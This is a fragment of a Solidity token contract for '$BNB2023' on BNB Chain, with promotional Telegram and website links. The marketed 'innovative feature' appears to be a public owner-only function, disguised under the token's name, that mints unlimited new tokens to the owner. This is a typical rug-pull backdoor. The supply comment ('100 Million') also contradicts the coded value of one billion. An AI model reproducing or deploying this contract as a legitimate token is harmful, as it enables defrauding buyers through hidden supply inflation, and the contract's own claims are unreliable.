...
//
// $BNB2023 proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/BNB2023_BSC
//  📱Website :: https://BNB2023.club
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BNB2023(uint256 amount) public onlyOwner {
 _BNB2023(msg.sender, amount);
    }
    ...
    function _BNB2023(address account, uint256 amount) internal virtual {
...
contract $BNB2023 is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("BNB2023", "2023") {
     _BNB2023(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}